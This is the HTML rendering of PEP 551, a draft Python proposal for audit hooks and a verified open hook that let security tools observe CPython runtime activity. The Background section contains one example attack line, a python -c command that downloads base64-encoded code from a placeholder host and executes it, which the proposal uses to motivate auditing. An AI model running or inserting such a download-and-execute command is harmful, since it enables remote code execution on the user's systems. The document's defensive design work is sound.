<!--
This HTML is auto-generated.  DO NOT EDIT THIS FILE!  If you are writing a new
PEP, see http://www.python.org/dev/peps/pep-0001 for instructions and links
to templates.  DO NOT USE THIS HTML FILE AS YOUR TEMPLATE!
-->
<table class="rfc2822 docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field"><th class="field-name">PEP:</th><td class="field-body">551</td>
</tr>
<tr class="field"><th class="field-name">Title:</th><td class="field-body">Security transparency in the Python runtime</td>
</tr>
<tr class="field"><th class="field-name">Version:</th><td class="field-body">$Revision$</td>
</tr>
<tr class="field"><th class="field-name">Last-Modified:</th><td class="field-body"><a class="reference external" href="https://hg.python.org/peps/file/tip/pep-0551.txt">$Date$</a></td>
</tr>
<tr class="field"><th class="field-name">Author:</th><td class="field-body">Steve Dower &lt;steve.dower&#32;&#97;t&#32;python.org&gt;</td>
</tr>
<tr class="field"><th class="field-name">Status:</th><td class="field-body">Draft</td>
</tr>
<tr class="field"><th class="field-name">Type:</th><td class="field-body">Standards Track</td>
</tr>
<tr class="field"><th class="field-name">Content-Type:</th><td class="field-body"><a class="reference external" href="/dev/peps/pep-0012">text/x-rst</a></td>
</tr>
<tr class="field"><th class="field-name">Created:</th><td class="field-body">23-Aug-2017</td>
</tr>
<tr class="field"><th class="field-name">Python-Version:</th><td class="field-body">3.7</td>
</tr>
<tr class="field"><th class="field-name">Post-History:</th><td class="field-body">24-Aug-2017 (security-sig), 28-Aug-2017 (python-dev)</td>
</tr>
</tbody>
</table>
<hr />
<div class="contents topic" id="contents">
<p class="topic-title first">Contents</p>
<ul class="simple">
<li><a class="reference internal" href="#abstract" id="id33">Abstract</a></li>
<li><a class="reference internal" href="#background" id="id34">Background</a></li>
<li><a class="reference internal" href="#overview-of-changes" id="id35">Overview of Changes</a><ul>
<li><a class="reference internal" href="#audit-hook" id="id36">Audit Hook</a></li>
<li><a class="reference internal" href="#verified-open-hook" id="id37">Verified Open Hook</a></li>
<li><a class="reference internal" href="#api-availability" id="id38">API Availability</a></li>
</ul>
</li>
<li><a class="reference internal" href="#audit-hook-locations" id="id39">Audit Hook Locations</a></li>
<li><a class="reference internal" href="#spython-entry-point" id="id40">SPython Entry Point</a></li>
<li><a class="reference internal" href="#performance-impact" id="id41">Performance Impact</a></li>
<li><a class="reference internal" href="#recommendations" id="id42">Recommendations</a></li>
<li><a class="reference internal" href="#rejected-ideas" id="id43">Rejected Ideas</a><ul>
<li><a class="reference internal" href="#separate-module-for-audit-hooks" id="id44">Separate module for audit hooks</a></li>
<li><a class="reference internal" href="#flag-in-sys-flags-to-indicate-secure-mode" id="id45">Flag in sys.flags to indicate &quot;secure&quot; mode</a></li>
</ul>
</li>
<li><a class="reference internal" href="#further-reading" id="id46">Further Reading</a></li>
<li><a class="reference internal" href="#references" id="id47">References</a></li>
<li><a class="reference internal" href="#acknowledgments" id="id48">Acknowledgments</a></li>
<li><a class="reference internal" href="#copyright" id="id49">Copyright</a></li>
</ul>
</div>
<div class="section" id="abstract">
<h1><a class="toc-backref" href="#id33">Abstract</a></h1>
<p>This PEP describes additions to the Python API and specific behaviors
for the CPython implementation that make actions taken by the Python
runtime visible to security and auditing tools. The goals in order of
increasing importance are to prevent malicious use of Python, to detect
and report on malicious use, and most importantly to detect attempts to
bypass detection. Most of the responsibility for implementation is
required from users, who must customize and build Python for their own
environment.</p>
<p>We propose two small sets of public APIs to enable users to reliably
build their copy of Python without having to modify the core runtime,
protecting future maintainability. We also discuss recommendations for
users to help them develop and configure their copy of Python.</p>
</div>
<div class="section" id="background">
<h1><a class="toc-backref" href="#id34">Background</a></h1>
<p>Software vulnerabilities are generally seen as bugs that enable remote
or elevated code execution. However, in our modern connected world, the
more dangerous vulnerabilities are those that enable advanced persistent
threats (APTs). APTs are achieved when an attacker is able to penetrate
a network, establish their software on one or more machines, and over
time extract data or intelligence. Some APTs may make themselves known
by maliciously damaging&nbsp;data (e.g., <a class="reference external" href="https://www.microsoft.com/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/WannaCrypt">WannaCrypt</a>)
or hardware (e.g., <a class="reference external" href="https://www.microsoft.com/wdsi/threats/malware-encyclopedia-description?name=Win32/Stuxnet">Stuxnet</a>).
Most attempt to hide their existence and avoid detection. APTs often use
a combination of traditional vulnerabilities, social engineering,
phishing (or spear-phishing), thorough network analysis, and an
understanding of misconfigured environments to establish themselves and
do their work.</p>
<p>The first infected machines may not be the final target&nbsp;and may not
require special privileges. For example, an APT that is established as a
non-administrative user on a developerâ€™s machine may have the ability to
spread to production machines through normal deployment channels. It is
common for APTs to persist on as many machines as possible, with sheer
weight of presence making them&nbsp;difficult to remove completely.</p>
<p>Whether an attacker&nbsp;is seeking to cause direct harm or hide their
tracks, the biggest barrier to detection is a lack of insight. System
administrators with large networks rely on distributed logs to
understand what their machines are doing, but logs are often filtered to
show only error conditions. APTs that are attempting to avoid detection
will rarely generate errors or abnormal events. Reviewing normal
operation logs involves a significant amount of effort, though work is
underway by a number of companies to enable automatic anomaly detection
within operational logs. The tools preferred by attackers are ones that
are already installed on the target machines, since log messages from
these tools are often expected and ignored in normal use.</p>
<p>At this point, we are not going to spend further time discussing the
existence of APTs or methods and mitigations that do not apply to this
PEP. For further information about the field, we recommend reading or
watching the resources listed under <a class="reference internal" href="#further-reading">Further Reading</a>.</p>
<p>Python is a particularly interesting tool for attackers due to its
prevalence on server and developer machines, its ability to execute
arbitrary code provided as data (as opposed to native binaries), and its
complete lack of internal auditing. This allows attackers to download,
decrypt, and execute malicious code with a single command:</p>
<pre class="literal-block">
python -c &quot;import urllib.request, base64;
    exec(base64.b64decode(
        urllib.request.urlopen('http://my-exploit/py.b64')
    ).decode())&quot;
</pre>
<p>This command currently bypasses most anti-malware scanners&nbsp;that rely on
recognizable code being read through a network connection or being
written to disk (base64 is often sufficient to bypass these checks). It
also bypasses protections such as file access control lists or
permissions (no file access occurs), approved application lists
(assuming Python has been approved for other uses), and automated
auditing or logging (assuming Python is allowed to access the internet
or&nbsp;access another machine on the local network from which to obtain its
payload).</p>
<p>General consensus among the security community is that totally
preventing attacks is infeasible and defenders should assume that they
will often detect attacks only after they have succeeded. This is known
as the &quot;assume breach&quot; mindset. <a class="footnote-reference" href="#id20" id="id1">[1]</a> In this scenario, protections such
as sandboxing&nbsp;and input validation have already failed, and the
important task is detection, tracking, and eventual removal of the
malicious code. To this end, the primary feature required from Python is
security transparency: the ability to see what operations the Python
runtime is performing that may indicate anomalous or malicious use.
Preventing such use is valuable, but secondary to the need to know that
it is occurring.</p>
<p>To summarise the goals in order of increasing importance:</p>
<ul class="simple">
<li>preventing malicious use is valuable</li>
<li>detecting malicious use is important</li>
<li>detecting attempts to bypass detection is critical</li>
</ul>
<p>One example of a scripting engine that has addressed these challenges is
PowerShell, which has recently been enhanced towards similar goals of
transparency and prevention. <a class="footnote-reference" href="#id21" id="id2">[2]</a></p>
<p>Generally, application and system configuration will determine which
events within a scripting engine are worth logging. However, given the
value of many logs events are not recognized until after an attack is
detected, it is important to capture as much as possible and filter
views rather than filtering at the source (see the No Easy Breach video
from <a class="reference internal" href="#further-reading">Further Reading</a>). Events that are always of interest include
attempts to bypass auditing, attempts to load and execute code that is
not correctly signed or access-controlled, use of uncommon operating
system functionality such as debugging or inter-process inspection
tools, most network access and DNS resolution, and attempts to create
and hide files or configuration settings on the local machine.</p>
<p>To summarize, defenders have a need to audit specific uses of Python in
order to detect abnormal or malicious usage. Currently, the Python
runtime does not provide any ability to do this, which (anecdotally) has
led to organizations switching to other languages. The aim of this PEP
is to enable system administrators to deploy a security transparent copy
of Python that can integrate with their existing auditing and protection
systems.</p>
<p>On Windows, some specific features that may be enabled by this include:</p>
<ul class="simple">
<li>Script Block Logging <a class="footnote-reference" href="#id22" id="id3">[3]</a></li>
<li>DeviceGuard <a class="footnote-reference" href="#id23" id="id4">[4]</a></li>
<li>AMSI <a class="footnote-reference" href="#id24" id="id5">[5]</a></li>
<li>Persistent Zone Identifiers <a class="footnote-reference" href="#id25" id="id6">[6]</a></li>
<li>Event tracing (which includes event forwarding) <a class="footnote-reference" href="#id26" id="id7">[7]</a></li>
</ul>
<p>On Linux, some specific features that may be integrated are:</p>
<ul class="simple">
<li>gnupg <a class="footnote-reference" href="#id27" id="id8">[8]</a></li>
<li>sd_journal <a class="footnote-reference" href="#id28" id="id9">[9]</a></li>
<li>OpenBSM <a class="footnote-reference" href="#id29" id="id10">[10]</a></li>
<li>syslog <a class="footnote-reference" href="#id30" id="id11">[11]</a></li>
<li>auditd <a class="footnote-reference" href="#id31" id="id12">[12]</a></li>
<li>SELinux labels <a class="footnote-reference" href="#id32" id="id13">[13]</a></li>
<li>check execute bit on imported modules</li>
</ul>
<p>On macOS, some features that may be used with the expanded APIs are:</p>
<ul class="simple">
<li>OpenBSM <a class="footnote-reference" href="#id29" id="id14">[10]</a></li>
<li>syslog <a class="footnote-reference" href="#id30" id="id15">[11]</a></li>
</ul>
<p>Overall, the ability to enable these platform-specific features on
production machines is highly appealing to system administrators and
will make Python a more trustworthy dependency for application
developers.</p>
</div>
<div class="section" id="overview-of-changes">
<h1><a class="toc-backref" href="#id35">Overview of Changes</a></h1>
<p>True security transparency is not fully achievable by Python in
isolation. The runtime can audit as many events as it likes, but unless
the logs are reviewed and analyzed there is no value. Python may impose
restrictions in the name of security, but usability may suffer.
Different platforms and environments will require different
implementations of certain security features, and organizations with the
resources to fully customize their runtime should be encouraged to do
so.</p>
<p>The aim of these changes is to enable system administrators to integrate
Python into their existing security systems, without dictating what
those systems look like or how they should behave. We propose two API
changes to enable this: an Audit Hook&nbsp;and Verified Open Hook. Both are
not set by default, and both require modifications to the entry point
binary to enable any functionality. For the purposes of validation and
example, we propose a new <tt class="docutils literal">spython</tt>/<tt class="docutils literal">spython.exe</tt> entry point
program that enables some basic functionality using these hooks.
<strong>However, security-conscious organizations are expected to create their
own entry points to meet their own needs.</strong></p>
<div class="section" id="audit-hook">
<h2><a class="toc-backref" href="#id36">Audit Hook</a></h2>
<p>In order to achieve security transparency, an API is required to raise
messages from within certain operations. These operations are typically
deep within the Python runtime or standard library, such as dynamic code
compilation, module imports, DNS resolution, or use of certain modules
such as <tt class="docutils literal">ctypes</tt>.</p>
<p>The new C APIs required for audit hooks are:</p>
<pre class="literal-block">
# Add an auditing hook
typedef int (*hook_func)(const char *event, PyObject *args,
                         void *userData);
int PySys_AddAuditHook(hook_func hook, void *userData);

# Raise an event with all auditing hooks
int PySys_Audit(const char *event, PyObject *args);

# Internal API used during Py_Finalize() - not publicly accessible
void _Py_ClearAuditHooks(void);
</pre>
<p>The new Python APIs for audit hooks are:</p>
<pre class="literal-block">
# Add an auditing hook
sys.addaudithook(hook: Callable[str, tuple]) -&gt; None

# Raise an event with all auditing hooks
sys.audit(str, *args) -&gt; None
</pre>
<p>Hooks are added by calling <tt class="docutils literal">PySys_AddAuditHook()</tt> from C at any time,
including before <tt class="docutils literal">Py_Initialize()</tt>, or by calling
<tt class="docutils literal">sys.addaudithook()</tt> from Python code. Hooks are never removed or
replaced, and existing hooks have an opportunity to refuse to allow new
hooks to be added (adding an audit hook is audited, and so preexisting
hooks can raise an exception to block the new addition).</p>
<p>When events of interest are occurring, code can either call
<tt class="docutils literal">PySys_Audit()</tt> from C (while the GIL is held) or <tt class="docutils literal">sys.audit()</tt>. The
string argument is the name of the event, and the tuple contains
arguments. A given event name should have a fixed schema for arguments,
and both arguments are considered a public API (for a given x.y version
of Python), and thus should only change between feature releases with
updated documentation.</p>
<p>When an event is audited, each hook is called in the order it was added
with the event name and tuple. If any hook returns with an exception
set, later hooks are ignored and <em>in general</em> the Python runtime should
terminate. This is intentional to allow hook implementations to decide
how to respond to any particular event. The typical responses will be to
log the event, abort the operation with an exception, or to immediately
terminate the process with an operating system exit call.</p>
<p>When an event is audited but no hooks have been set, the <tt class="docutils literal">audit()</tt>
function should include minimal overhead. Ideally, each argument is a
reference to existing data&nbsp;rather than a value calculated just for the
auditing call.</p>
<p>As hooks may be Python objects, they need to be freed during
<tt class="docutils literal">Py_Finalize()</tt>. To do this, we add an internal API
<tt class="docutils literal">_Py_ClearAuditHooks()</tt> that releases any <tt class="docutils literal">PyObject*</tt> hooks that are
held, as well as any heap memory used. This is an internal function with
no public export, but it triggers an event for all audit hooks to ensure
that unexpected calls are logged.</p>
<p>See <a class="reference internal" href="#audit-hook-locations">Audit Hook Locations</a> for proposed audit hook points and schemas,
and the <a class="reference internal" href="#recommendations">Recommendations</a> section for discussion on
appropriate&nbsp;responses.</p>
</div>
<div class="section" id="verified-open-hook">
<h2><a class="toc-backref" href="#id37">Verified Open Hook</a></h2>
<p>Most operating systems have a mechanism to distinguish between files
that can be executed and those that can not. For example, this may be an
execute bit in the permissions field, or a verified hash of the file
contents to detect potential code tampering. These are an important
security mechanism for preventing execution of data or code that is not
approved for a given environment. Currently, Python has no way to
integrate with these when launching scripts or importing modules.</p>
<p>The new public C API for the verified open hook is:</p>
<pre class="literal-block">
# Set the handler
typedef PyObject *(*hook_func)(PyObject *path)
int PyImport_SetOpenForImportHook(void *handler)

# Open a file using the handler
PyObject *PyImport_OpenForImport(const char *path)
</pre>
<p>The new public Python API for the verified open hook is:</p>
<pre class="literal-block">
# Open a file using the handler
_imp.open_for_import(path)
</pre>
<p>The <tt class="docutils literal">_imp.open_for_import()</tt> function is a drop-in replacement&nbsp;for
<tt class="docutils literal">open(str(pathlike), 'rb')</tt>. Its default behaviour is to open a file
for raw, binary access - any more restrictive behaviour requires the
use of a custom handler. Only <tt class="docutils literal">str</tt> arguments are accepted.</p>
<p>A custom handler may be set by calling <tt class="docutils literal">PyImport_SetOpenForImportHook()</tt>
from C at any time, including before <tt class="docutils literal">Py_Initialize()</tt>. However, if a
hook has already been set then the call will fail. When
<tt class="docutils literal">open_for_import()</tt> is called with a hook set, the hook will be passed
the path and its return value will be returned directly. The returned
object should be an open file-like object that supports reading raw
bytes. This is explicitly intended to allow a <tt class="docutils literal">BytesIO</tt> instance if
the open handler has already had to read the file into memory in order
to perform whatever verification is necessary to determine whether the
content is permitted to be executed.</p>
<p>Note that these hooks can import and call the <tt class="docutils literal">_io.open()</tt> function on
CPython without triggering themselves.</p>
<p>If the hook determines that the file is not suitable for execution, it
should raise an exception of its choice, as well as raising any other
auditing events or notifications.</p>
<p>All import and execution functionality involving code from a file will
be changed to use <tt class="docutils literal">open_for_import()</tt> unconditionally. It is important
to note that calls to <tt class="docutils literal">compile()</tt>, <tt class="docutils literal">exec()</tt> and <tt class="docutils literal">eval()</tt> do not go
through this function - an audit hook that includes the code from these
calls will be added and is the best opportunity to validate code that is
read from the file. Given the current decoupling between import and
execution in Python, most imported code will go through both
<tt class="docutils literal">open_for_import()</tt> and the log hook for <tt class="docutils literal">compile</tt>, and so care
should be taken to avoid repeating verification steps.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">The use of <tt class="docutils literal">open_for_import()</tt> by <tt class="docutils literal">importlib</tt> is a valuable
first defence, but should not be relied upon to prevent misuse. In
particular, it is easy to monkeypatch <tt class="docutils literal">importlib</tt> in order to
bypass the call. Auditing hooks are the primary way to achieve
security transparency, and are essential for detecting attempts to
bypass other functionality.</p>
</div>
</div>
<div class="section" id="api-availability">
<h2><a class="toc-backref" href="#id38">API Availability</a></h2>
<p>While all the functions added here are considered public and stable API,
the behavior of the functions is implementation specific. The
descriptions here refer&nbsp;to the CPython&nbsp;implementation, and while other
implementations should provide the functions, there is no requirement
that they behave the same.</p>
<p>For example, <tt class="docutils literal">sys.addaudithook()</tt> and <tt class="docutils literal">sys.audit()</tt> should exist but
may do nothing. This allows code to make calls to <tt class="docutils literal">sys.audit()</tt>
without having to test for existence, but it should not assume that its
call will have any effect. (Including existence tests in
security-critical code allows another vector to bypass auditing, so it
is preferable that the function always exist.)</p>
<p><tt class="docutils literal">_imp.open_for_import(path)</tt> should at a minimum always return
<tt class="docutils literal">_io.open(path, 'rb')</tt>. Code using the function should make no further
assumptions about what may occur, and implementations other than CPython
are not required to let developers override the behavior of this
function with a hook.</p>
</div>
</div>
<div class="section" id="audit-hook-locations">
<h1><a class="toc-backref" href="#id39">Audit Hook Locations</a></h1>
<p>Calls to <tt class="docutils literal">sys.audit()</tt> or <tt class="docutils literal">PySys_Audit()</tt> will be added to the
following operations with the schema in Table 1. Unless otherwise
specified, the ability for audit hooks to abort any listed operation
should be considered part of the rationale for including the hook.</p>
<table border="1" class="colwidths-given docutils">
<caption>Table 1: Audit Hooks</caption>
<colgroup>
<col width="15%" />
<col width="15%" />
<col width="23%" />
<col width="46%" />
</colgroup>
<thead valign="bottom">
<tr><th class="head">API Function</th>
<th class="head">Event Name</th>
<th class="head">Arguments</th>
<th class="head">Rationale</th>
</tr>
</thead>
<tbody valign="top">
<tr><td><tt class="docutils literal">PySys_AddAuditHook</tt></td>
<td><tt class="docutils literal">sys.addaudithook</tt></td>
<td>&nbsp;</td>
<td>Detect when new
audit hooks are being added.</td>
</tr>
<tr><td><tt class="docutils literal">_PySys_ClearAuditHooks</tt></td>
<td><tt class="docutils literal">sys._clearaudithooks</tt></td>
<td>&nbsp;</td>
<td>Notifies
hooks they are being cleaned up, mainly in case the event is
triggered unexpectedly. This event cannot be aborted.</td>
</tr>
<tr><td><tt class="docutils literal">PyImport_SetOpenForImportHook</tt></td>
<td><tt class="docutils literal">setopenforimporthook</tt></td>
<td>&nbsp;</td>
<td>Detects any attempt to set the <tt class="docutils literal">open_for_import</tt> hook.</td>
</tr>
<tr><td><tt class="docutils literal">compile</tt>, <tt class="docutils literal">exec</tt>, <tt class="docutils literal">eval</tt>, <tt class="docutils literal">PyAst_CompileString</tt>,
<tt class="docutils literal">PyAST_obj2mod</tt></td>
<td><tt class="docutils literal">compile</tt></td>
<td><tt class="docutils literal">(code, filename_or_none)</tt></td>
<td>Detect dynamic code compilation, where <tt class="docutils literal">code</tt> could be a string or
AST. Note that this will be called for regular imports of source
code, including those that were opened with <tt class="docutils literal">open_for_import</tt>.</td>
</tr>
<tr><td><tt class="docutils literal">exec</tt>, <tt class="docutils literal">eval</tt>, <tt class="docutils literal">run_mod</tt></td>
<td><tt class="docutils literal">exec</tt></td>
<td><tt class="docutils literal">(code_object,)</tt></td>
<td>Detect dynamic execution of code objects. This only occurs for
explicit calls, and is not raised for normal function invocation.</td>
</tr>
<tr><td><tt class="docutils literal">import</tt></td>
<td><tt class="docutils literal">import</tt></td>
<td><tt class="docutils literal">(module, filename, sys.path,
sys.meta_path, sys.path_hooks)</tt></td>
<td>Detect when modules are
imported. This is raised before the module name is resolved to a
file. All arguments other than the module name may be <tt class="docutils literal">None</tt> if
they are not used or available.</td>
</tr>
<tr><td><tt class="docutils literal">code_new</tt></td>
<td><tt class="docutils literal">code.__new__</tt></td>
<td><tt class="docutils literal">(bytecode, filename, name)</tt></td>
<td>Detect dynamic creation of code objects. This only occurs for
direct instantiation, and is not raised for normal compilation.</td>
</tr>
<tr><td><tt class="docutils literal">func_new_impl</tt></td>
<td><tt class="docutils literal">function.__new__</tt></td>
<td><tt class="docutils literal">(code,)</tt></td>
<td>Detect
dynamic creation of function objects. This only occurs for direct
instantiation, and is not raised for normal compilation.</td>
</tr>
<tr><td><tt class="docutils literal">_ctypes.dlopen</tt>, <tt class="docutils literal">_ctypes.LoadLibrary</tt></td>
<td><tt class="docutils literal">ctypes.dlopen</tt></td>
<td><tt class="docutils literal">(module_or_path,)</tt></td>
<td>Detect when native modules are used.</td>
</tr>
<tr><td><tt class="docutils literal">_ctypes._FuncPtr</tt></td>
<td><tt class="docutils literal">ctypes.dlsym</tt></td>
<td><tt class="docutils literal">(lib_object, name)</tt></td>
<td>Collect information about specific symbols retrieved from native
modules.</td>
</tr>
<tr><td><tt class="docutils literal">_ctypes._CData</tt></td>
<td><tt class="docutils literal">ctypes.cdata</tt></td>
<td><tt class="docutils literal">(ptr_as_int,)</tt></td>
<td>Detect
when code is accessing arbitrary memory using <tt class="docutils literal">ctypes</tt>.</td>
</tr>
<tr><td><tt class="docutils literal">id</tt></td>
<td><tt class="docutils literal">id</tt></td>
<td><tt class="docutils literal">(id_as_int,)</tt></td>
<td>Detect when code is accessing
the id of objects, which in CPython reveals information about
memory layout.</td>
</tr>
<tr><td><tt class="docutils literal">sys._getframe</tt></td>
<td><tt class="docutils literal">sys._getframe</tt></td>
<td><tt class="docutils literal">(frame_object,)</tt></td>
<td>Detect
when code is accessing frames directly.</td>
</tr>
<tr><td><tt class="docutils literal">sys._current_frames</tt></td>
<td><tt class="docutils literal">sys._current_frames</tt></td>
<td>&nbsp;</td>
<td>Detect when
code is accessing frames directly.</td>
</tr>
<tr><td><tt class="docutils literal">PyEval_SetProfile</tt></td>
<td><tt class="docutils literal">sys.setprofile</tt></td>
<td>&nbsp;</td>
<td>Detect when code is
injecting trace functions. Because of the implementation, exceptions
raised from the hook will abort the operation, but will not be
raised in Python code. Note that <tt class="docutils literal">threading.setprofile</tt> eventually
calls this function, so the event will be audited for each thread.</td>
</tr>
<tr><td><tt class="docutils literal">PyEval_SetTrace</tt></td>
<td><tt class="docutils literal">sys.settrace</tt></td>
<td>&nbsp;</td>
<td>Detect when code is
injecting trace functions. Because of the implementation, exceptions
raised from the hook will abort the operation, but will not be
raised in Python code. Note that <tt class="docutils literal">threading.settrace</tt> eventually
calls this function, so the event will be audited for each thread.</td>
</tr>
<tr><td><tt class="docutils literal">_PyEval_SetAsyncGenFirstiter</tt></td>
<td><tt class="docutils literal">sys.set_async_gen_firstiter</tt></td>
<td>&nbsp;</td>
<td>Detect changes to async generator hooks.</td>
</tr>
<tr><td><tt class="docutils literal">_PyEval_SetAsyncGenFinalizer</tt></td>
<td><tt class="docutils literal">sys.set_async_gen_finalizer</tt></td>
<td>&nbsp;</td>
<td>Detect changes to async generator hooks.</td>
</tr>
<tr><td><tt class="docutils literal">_PyEval_SetCoroutineWrapper</tt></td>
<td><tt class="docutils literal">sys.set_coroutine_wrapper</tt></td>
<td>&nbsp;</td>
<td>Detect changes to the coroutine wrapper.</td>
</tr>
<tr><td><tt class="docutils literal">socket.bind</tt>, <tt class="docutils literal">socket.connect</tt>, <tt class="docutils literal">socket.connect_ex</tt>,
<tt class="docutils literal">socket.getaddrinfo</tt>, <tt class="docutils literal">socket.getnameinfo</tt>, <tt class="docutils literal">socket.sendmsg</tt>,
<tt class="docutils literal">socket.sendto</tt></td>
<td><tt class="docutils literal">socket.address</tt></td>
<td><tt class="docutils literal">(address,)</tt></td>
<td>Detect
access to network resources. The address is unmodified from the
original call.</td>
</tr>
<tr><td><tt class="docutils literal">socket.__init__</tt></td>
<td>socket()</td>
<td><tt class="docutils literal">(family, type, proto)</tt></td>
<td>Detect creation of sockets. The arguments will be int values.</td>
</tr>
<tr><td><tt class="docutils literal">socket.gethostname</tt></td>
<td><tt class="docutils literal">socket.gethostname</tt></td>
<td>&nbsp;</td>
<td>Detect attempts
to retrieve the current host name.</td>
</tr>
<tr><td><tt class="docutils literal">socket.sethostname</tt></td>
<td><tt class="docutils literal">socket.sethostname</tt></td>
<td><tt class="docutils literal">(name,)</tt></td>
<td>Detect attempts to change the current host name. The name argument
is passed as a bytes object.</td>
</tr>
<tr><td><tt class="docutils literal">socket.gethostbyname</tt>, <tt class="docutils literal">socket.gethostbyname_ex</tt></td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr><td><tt class="docutils literal">socket.gethostbyname</tt></td>
<td><tt class="docutils literal">(name,)</tt></td>
<td>Detect host name
resolution. The name argument is a str or bytes object.</td>
<td>&nbsp;</td>
</tr>
<tr><td><tt class="docutils literal">socket.gethostbyaddr</tt></td>
<td><tt class="docutils literal">socket.gethostbyaddr</tt></td>
<td><tt class="docutils literal">(address,)</tt></td>
<td>Detect host resolution. The address argument is a
str or bytes object.</td>
</tr>
<tr><td><tt class="docutils literal">socket.getservbyname</tt></td>
<td><tt class="docutils literal">socket.getservbyname</tt></td>
<td><tt class="docutils literal">(name,
protocol)</tt></td>
<td>Detect service resolution. The arguments are str
objects.</td>
</tr>
<tr><td><tt class="docutils literal">socket.getservbyport</tt></td>
<td><tt class="docutils literal">socket.getservbyport</tt></td>
<td><tt class="docutils literal">(port,
protocol)</tt></td>
<td>Detect service resolution. The port argument is an
int and protocol is a str.</td>
</tr>
<tr><td><tt class="docutils literal">member_get</tt>, <tt class="docutils literal">func_get_code</tt>, <tt class="docutils literal">func_get_[kw]defaults</tt></td>
<td><tt class="docutils literal">object.__getattr__</tt></td>
<td><tt class="docutils literal">(object, attr)</tt></td>
<td>Detect access to
restricted attributes. This event is raised for any built-in
members that are marked as restricted, and members that may allow
bypassing imports.</td>
</tr>
<tr><td><tt class="docutils literal">_PyObject_GenericSetAttr</tt>, <tt class="docutils literal">check_set_special_type_attr</tt>,
<tt class="docutils literal">object_set_class</tt>, <tt class="docutils literal">func_set_code</tt>, <tt class="docutils literal">func_set_[kw]defaults</tt></td>
<td><tt class="docutils literal">object.__setattr__</tt></td>
<td><tt class="docutils literal">(object, attr, value)</tt></td>
<td>Detect monkey
patching of types and objects. This event
is raised for the <tt class="docutils literal">__class__</tt> attribute and any attribute on
<tt class="docutils literal">type</tt> objects.</td>
</tr>
<tr><td><tt class="docutils literal">_PyObject_GenericSetAttr</tt></td>
<td><tt class="docutils literal">object.__delattr__</tt></td>
<td><tt class="docutils literal">(object,
attr)</tt></td>
<td>Detect deletion of object attributes. This event is raised
for any attribute on <tt class="docutils literal">type</tt> objects.</td>
</tr>
<tr><td><tt class="docutils literal">Unpickler.find_class</tt></td>
<td><tt class="docutils literal">pickle.find_class</tt></td>
<td><tt class="docutils literal">(module_name,
global_name)</tt></td>
<td>Detect imports and global name lookup when
unpickling.</td>
</tr>
<tr><td><tt class="docutils literal">array_new</tt></td>
<td><tt class="docutils literal">array.__new__</tt></td>
<td><tt class="docutils literal">(typecode, initial_value)</tt></td>
<td>Detects creation of array objects.</td>
</tr>
</tbody>
</table>
<p>TODO - more hooks in <tt class="docutils literal">_socket</tt>, <tt class="docutils literal">_ssl</tt>, others?</p>
</div>
<div class="section" id="spython-entry-point">
<h1><a class="toc-backref" href="#id40">SPython Entry Point</a></h1>
<p>A new entry point binary will be added, called <tt class="docutils literal">spython.exe</tt> on
Windows and <tt class="docutils literal">spythonX.Y</tt> on other platforms. This entry point is
intended primarily as an example, as we expect most users of this
functionality to implement their own entry point and hooks (see
<a class="reference internal" href="#recommendations">Recommendations</a>). It will also be used for tests.</p>
<p>Source builds will build <tt class="docutils literal">spython</tt> by default, but distributions
should not include it except as a test binary. The python.org managed
binary distributions will not include <tt class="docutils literal">spython</tt>.</p>
<p><strong>Do not accept most command-line arguments</strong></p>
<p>The <tt class="docutils literal">spython</tt> entry point requires a script file be passed as the
first argument, and does not allow any options. This prevents arbitrary
code execution from in-memory data or non-script files (such as pickles,
which can be executed using <tt class="docutils literal"><span class="pre">-m</span> pickle &lt;path&gt;</tt>.</p>
<p>Options <tt class="docutils literal"><span class="pre">-B</span></tt> (do not write bytecode), <tt class="docutils literal"><span class="pre">-E</span></tt> (ignore environment
variables) and <tt class="docutils literal"><span class="pre">-s</span></tt> (no user site) are assumed.</p>
<p>If a file with the same full path as the process with a <tt class="docutils literal">._pth</tt> suffix
(<tt class="docutils literal">spython._pth</tt> on Windows, <tt class="docutils literal">spythonX.Y._pth</tt> on Linux) exists, it
will be used to initialize <tt class="docutils literal">sys.path</tt> following the rules currently
described <a class="reference external" href="https://docs.python.org/3/using/windows.html#finding-modules">for Windows</a>.</p>
<p>When built with <tt class="docutils literal">Py_DEBUG</tt>, the <tt class="docutils literal">spython</tt> entry point will allow a
<tt class="docutils literal"><span class="pre">-i</span></tt> option with no other arguments to enter into interactive mode,
with audit messages being written to standard error rather than a file.
This is intended for testing and debugging only.</p>
<p><strong>Log security events to a file</strong></p>
<p>Before initialization, <tt class="docutils literal">spython</tt> will set an audit hook that writes
events to a local file. By default, this file is the full path of the
process with a <tt class="docutils literal">.log</tt> suffix, but may be overridden with the
<tt class="docutils literal">SPYTHONLOG</tt> environment variable (despite such overrides being
explicitly discouraged in <a class="reference internal" href="#recommendations">Recommendations</a>).</p>
<p>The audit hook will also abort all <tt class="docutils literal">sys.addaudithook</tt> events,
preventing any other hooks from being added.</p>
<p><strong>Restrict importable modules</strong></p>
<p>Also before initialization, <tt class="docutils literal">spython</tt> will set an open-for-import
hook that validates all files opened with <tt class="docutils literal">os.open_for_import</tt>. This
implementation will require all files to have a <tt class="docutils literal">.py</tt> suffix (thereby
blocking the use of cached bytecode), and will raise a custom audit
event <tt class="docutils literal">spython.open_for_import</tt> containing <tt class="docutils literal">(filename,
True_if_allowed)</tt>.</p>
<p>On Windows, the hook will also open the file with flags that prevent any
other process from opening it with write access, which allows the hook
to perform additional validation on the contents with confidence that it
will not be modified between the check and use. Compilation will later
trigger a <tt class="docutils literal">compile</tt> event, so there is no need to read the contents
now for AMSI, but other validation mechanisms such as DeviceGuard <a class="footnote-reference" href="#id23" id="id16">[4]</a>
should be performed here.</p>
<p><strong>Restrict globals in pickles</strong></p>
<p>The <tt class="docutils literal">spython</tt> entry point will abort all <tt class="docutils literal">pickle.find_class</tt> events
that use the default implementation. Overrides will not raise audit
events unless explicitly added, and so they will continue to be allowed.</p>
</div>
<div class="section" id="performance-impact">
<h1><a class="toc-backref" href="#id41">Performance Impact</a></h1>
<p>The important performance impact is the case where events are being
raised but there are no hooks attached. This is the unavoidable case -
once a distributor or sysadmin begins adding audit hooks they have
explicitly chosen to trade performance for functionality. Performance
impact using <tt class="docutils literal">spython</tt> or with hooks added are not of interest here,
since this is considered opt-in functionality.</p>
